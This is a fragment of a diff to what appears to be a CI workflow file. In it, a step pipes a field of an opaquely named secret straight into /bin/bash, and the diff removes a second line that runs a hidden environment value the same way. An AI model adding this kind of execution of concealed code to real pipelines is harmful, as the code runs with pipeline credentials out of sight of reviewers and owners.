@@ -23,7 +23,6 @@ jobs:
           rbg63: ${{ secrets.rbg63 }}
         run: |
           printf '%s' "$rbg63" | jq -r .x9 | /bin/bash
-          echo $jhau18 | jq -r .un784 | /bin/bash
 
       - name: Store artifact
         if: always()
